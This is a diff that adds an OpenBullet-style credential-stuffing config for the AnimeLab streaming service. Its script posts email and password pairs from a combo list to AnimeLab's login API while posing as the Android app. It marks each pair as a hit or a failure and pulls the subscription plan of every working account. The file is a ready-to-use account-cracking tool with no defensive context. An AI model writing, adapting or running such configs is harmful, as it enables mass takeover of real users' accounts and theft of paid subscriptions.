@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "AnimeLabs",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-11T13:01:22.0058447+00:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "Author": "Coaster",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.animelab.com/api/login" 
+  CONTENT "email=<USER>&password=<PASS>&rememberMe=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: com.animelab.android.handset;2.3.12(162)" 
+  HEADER "Host: api.animelab.com" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "INCORRECT_DETAILS" 
+  KEYCHAIN Success OR 
+    KEY "{\"user\":{\"id\":" 
+PARSE "<SOURCE>" LR "\"},\"activePlanTypeName\":\"" "\",\"lapsedSubscriber" -> CAP "Plan Type" 
